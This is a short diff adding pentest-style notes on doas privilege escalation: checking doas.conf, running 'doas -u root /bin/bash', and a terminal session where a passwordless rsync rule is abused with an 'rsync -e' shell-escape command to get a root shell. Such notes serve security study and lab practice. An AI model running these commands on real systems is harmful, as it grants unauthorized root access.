@@ -1,0 +1,13 @@
+doas
+
+check doas.config
+
+or
+
+doas -u root /bin/bash
+
+```
+kiran@ubuntu-xenial:~$ cat /usr/local/etc/doas.conf
+ permit nopass kiran as root cmd rsync
+kiran@ubuntu-xenial:~$ doas rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
+```
